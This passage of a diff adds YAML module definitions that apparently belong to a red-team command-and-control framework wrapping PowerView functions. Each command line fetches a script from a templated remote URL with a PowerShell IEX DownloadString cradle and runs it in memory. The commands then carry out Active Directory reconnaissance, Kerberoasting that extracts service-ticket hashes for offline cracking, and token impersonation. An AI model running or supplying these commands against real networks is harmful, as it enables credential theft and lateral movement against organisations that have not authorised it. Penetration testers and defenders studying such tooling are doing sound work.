+    author: "Will Schroeder (@harmj0y) "
+    description: "Enumerates members of a specific local group on the local (or remote) machine."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-NetLocalGroupMember {{ComputerName.Value}} {{GroupName.Value}} {{Method.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for shares (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: GroupName
+        value: null
+        required: false
+        flag: -GroupName
+        description: "The local group name to query for users. If not given, it defaults to \"Administrators\"."
+      -
+        name: Method
+        value: null
+        required: false
+        flag: -Method
+        description: "The collection method to use, defaults to 'API', also accepts 'WinNT'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to a remote machine. Only applicable with \"-Method WinNT\"."
+
+  -
+    name: Get-DomainTrust
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Return all domain trusts for the current domain or a specified domain."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainTrust {{Domain.Value}} {{API.Flag}} {{NET.Flag}} {{LDAPFilter.Value}} {{Properties.Value}} {{SearchBase.Value}} {{Server.Value}}
+      {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{SecurityMasks.Value}} {{Tombstone.Flag}} {{FindOne.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: API
+        value: null
+        required: false
+        flag: -API
+        description: "Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in .NET methods."
+      -
+        name: NET
+        value: null
+        required: false
+        flag: -NET
+        description: "Switch. Use .NET queries to enumerate trusts instead of the default LDAP method."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: Properties
+        value: null
+        required: false
+        flag: -Properties
+        description: "Specifies the properties of the output object to retrieve from the server."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: FindOne
+        value: null
+        required: false
+        flag: -FindOne
+        description: "Only return one result object."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-ForestTrust
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Return all forest trusts for the current forest or a specified forest."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-Forest {{Forest.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: Forest
+        value: null
+        required: false
+        flag: -Forest
+        description: "The forest name to query for, defaults to the current forest."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Get-NetShare
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns open shares on the local (or a remote) machine."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-NetShare {{ComputerName.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for shares (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote system using Invoke-UserImpersonation."
+
+  -
+    name: Get-NetLoggedon
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns users logged on the local (or a remote) machine. Note: administrative rights needed for newer Windows OSes."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-NetLoggedon {{ComputerName.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for shares (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote system using Invoke-UserImpersonation."
+
+  -
+    name: Get-RegLoggedOn
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Matt Kelly (@BreakersAll)   "
+    description: "Returns who is logged onto the local (or a remote) machine through enumeration of remote registry keys."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-RegLoggedOn {{ComputerName.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for shares (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote system using Invoke-UserImpersonation."
+
+  -
+    name: Get-NetSession
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns session information for the local (or a remote) machine."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-NetSession {{ComputerName.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for shares (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote system using Invoke-UserImpersonation."
+
+  -
+    name: Get-NetRDPSession
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns remote desktop/session information for the local (or a remote) machine."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-NetRDPSession {{ComputerName.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for active sessions (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote system using Invoke-UserImpersonation."
+
+  -
+    name: Find-DomainProcess
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Searches for processes on the domain using WMI, returning processes that match a particular user specification or process name."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Find-DomainProcess {{ComputerName.Value}} {{Domain.Value}} {{ComputerDomain.Value}} {{ComputerLDAPFilter.Value}} {{ComputerSearchBase.Value}}
+     {{ComputerUnconstrained.Value}} {{ComputerOperatingSystem.Flag}} {{ComputerServicePack.Value}} {{ComputerSiteName.Value}} {{ProcessName.Value}} {{UserIdentity.Value}} {{UserDomain.Value}} {{UserLDAPFilter.Value}}
+      {{UserSearchBase.Value}} {{UserGroupIdentity.Value}} {{UserAdminCount.Flag}} {{Server.Value}} {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{Tombstone.Flag}} {{OutputFormat.Value}} 
+      {{StopOnSuccess.Flag}} {{Delay.Value}} {{Jitter.Value}} {{Threads.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies an array of one or more hosts to enumerate, passable on the pipeline. If -ComputerName is not passed, the default behavior is to enumerate all machines in the domain returned by Get-DomainComputer."
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to query for computers AND users, defaults to the current domain."
+      -
+        name: ComputerDomain
+        value: null
+        required: false
+        flag: -ComputerDomain
+        description: "Specifies the domain to query for computers, defaults to the current domain."
+      -
+        name: ComputerLDAPFilter
+        value: null
+        required: false
+        flag: -ComputerLDAPFilter
+        description: "Specifies an LDAP query string that is used to search for computer objects."
+      -
+        name: ComputerSearchBase
+        value: null
+        required: false
+        flag: -ComputerSearchBase
+        description: "Specifies the LDAP source to search through for computers, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries."
+      -
+        name: ComputerUnconstrained
+        value: null
+        required: false
+        flag: -ComputerUnconstrained
+        description: "Switch. Search computer objects that have unconstrained delegation."
+      -
+        name: ComputerOperatingSystem
+        value: null
+        required: false
+        flag: -ComputerOperatingSystem
+        description: "Search computers with a specific operating system, wildcards accepted."
+      -
+        name: ComputerServicePack
+        value: null
+        required: false
+        flag: -ComputerServicePack
+        description: "Search computers with a specific service pack, wildcards accepted."
+      -
+        name: ComputerSiteName
+        value: null
+        required: false
+        flag: -ComputerSiteName
+        description: "Search computers in the specific AD Site name, wildcards accepted."
+      -
+        name: ProcessName
+        value: null
+        required: false
+        flag: -ProcessName
+        description: "Search for processes with one or more specific names."
+      -
+        name: UserIdentity
+        value: null
+        required: false
+        flag: -UserIdentity
+        description: "Specifies one or more user identities to search for."
+      -
+        name: UserDomain
+        value: null
+        required: false
+        flag: -UserDomain
+        description: "Specifies the domain to query for users to search for, defaults to the current domain."
+      -
+        name: UserLDAPFilter
+        value: null
+        required: false
+        flag: -UserLDAPFilter
+        description: "Specifies an LDAP query string that is used to search for target users."
+      -
+        name: UserSearchBase
+        value: null
+        required: false
+        flag: -UserSearchBase
+        description: "Specifies the LDAP source to search through for target users. e.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries."
+      -
+        name: UserGroupIdentity
+        value: null
+        required: false
+        flag: -UserGroupIdentity
+        description: "Specifies a group identity to query for target users, defaults to 'Domain Admins. If any other user specifications are set, then UserGroupIdentity is ignored."
+      -
+        name: UserAdminCount
+        value: null
+        required: false
+        flag: -UserAdminCount
+        description: "Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged)."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: OutputFormat
+        value: null
+        required: false
+        flag: -OutputFormat
+        description: "Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format. Defaults to 'Hashcat'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+      -
+        name: StopOnSuccess
+        value: null
+        required: false
+        flag: -StopOnSuccess
+        description: "Switch. Stop hunting after finding after finding a target user."
+      -
+        name: Delay
+        value: null
+        required: false
+        flag: -Delay
+        description: "Specifies the delay (in seconds) between enumerating hosts, defaults to 0."
+      -
+        name: Jitter
+        value: null
+        required: false
+        flag: -Jitter
+        description: "Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3"
+      -
+        name: Threads
+        value: null
+        required: false
+        flag: -Threads
+        description: "The number of threads to use for user searching, defaults to 20."
+
+  -
+    name: Get-WMIProcess
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y) "
+    description: "Returns a list of processes and their owners on the local or remote machine."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-WMIProcess {{ComputerName.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Specifies the hostname to query for cached RDP connections (also accepts IP addresses). Defaults to 'localhost'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote system."
+
+  -
+    name: Get-DomainSPNTicket
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "machosec, Will Schroeder (@harmj0y)   "
+    description: "Request the kerberos ticket for a specified service principal name (SPN)."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Get-DomainSPNTicket {{SPN.Value}} {{User.Value}}
+      {{OutputFormat.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: SPN
+        value: null
+        required: false
+        flag: -SPN
+        description: "Specifies the service principal name to request the ticket for."
+      -
+        name: User
+        value: null
+        required: false
+        flag: -User
+        description: "Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for."
+      -
+        name: OutputFormat
+        value: null
+        required: false
+        flag: -OutputFormat
+        description: "Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format. Defaults to 'John'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote domain using Invoke-UserImpersonation."
+
+  -
+    name: Invoke-Kerberoast
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y), @machosec  "
+    description: "Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Invoke-Kerberoast {{Identity.Value}} {{Domain.Value}} {{LDAPFilter.Value}} {{SearchBase.Value}} {{Server.Value}}
+      {{SearchScope.Value}} {{ResultPageSize.Value}} {{ServerTimeLimit.Value}} {{Tombstone.Flag}} {{OutputFormat.Value}} {{Credential.Value}}"
+    options:
+      -
+        name: Identity
+        value: null
+        required: false
+        flag: -Identity
+        description: "A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201). Wildcards accepted."
+      -
+        name: Domain
+        value: null
+        required: false
+        flag: -Domain
+        description: "Specifies the domain to use for the query, defaults to the current domain."
+      -
+        name: LDAPFilter
+        value: null
+        required: false
+        flag: -LDAPFilter
+        description: "Specifies an LDAP query string that is used to filter Active Directory objects."
+      -
+        name: SearchBase
+        value: null
+        required: false
+        flag: -SearchBase
+        description: "The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\" Useful for OU queries."
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Specifies an Active Directory server (domain controller) to bind to."
+      -
+        name: SearchScope
+        value: null
+        required: false
+        flag: -SearchScope
+        description: "Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."
+      -
+        name: ResultPageSize
+        value: null
+        required: false
+        flag: -ResultPageSize
+        description: "Specifies the PageSize to set for the LDAP searcher object."
+      -
+        name: ServerTimeLimit
+        value: null
+        required: false
+        flag: -ServerTimeLimit
+        description: "Specifies the maximum amount of time the server spends searching. Default of 120 seconds."
+      -
+        name: Tombstone
+        value: null
+        required: false
+        flag: -Tombstone
+        description: "Switch. Specifies that the searcher should also return deleted/tombstoned objects."
+      -
+        name: OutputFormat
+        value: null
+        required: false
+        flag: -OutputFormat
+        description: "Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format. Defaults to 'Hashcat'."
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."
+
+  -
+    name: Invoke-UserImpersonation
+    file: "PowerView.ps1"
+    arch: x64
+    privilege: false
+    author: "Will Schroeder (@harmj0y), @machosec  "
+    description: "Creates a new \"runas /netonly\" type logon and impersonates the token."
+    cmd: "powershell.exe IEX (New-Object Net.WebClient).DownloadString($url$);Invoke-UserImpersonation {{Credential.Value}} {{TokenHandle.Value}} {{Quiet.Value}}"
+    options:
+      -
+        name: Credential
+        value: null
+        required: false
+        flag: -Credential
+        description: "A [Management.Automation.PSCredential] object with alternate credentials to impersonate in the current thread space."
+      -
+        name: TokenHandle
+        value: null
+        required: false
+        flag: -TokenHandle
+        description: "An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation. If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser() is executed."
+      -
+        name: Quiet
+        value: null
+        required: false
+        flag: -Quiet
+        description: "Suppress any warnings about STA vs MTA."
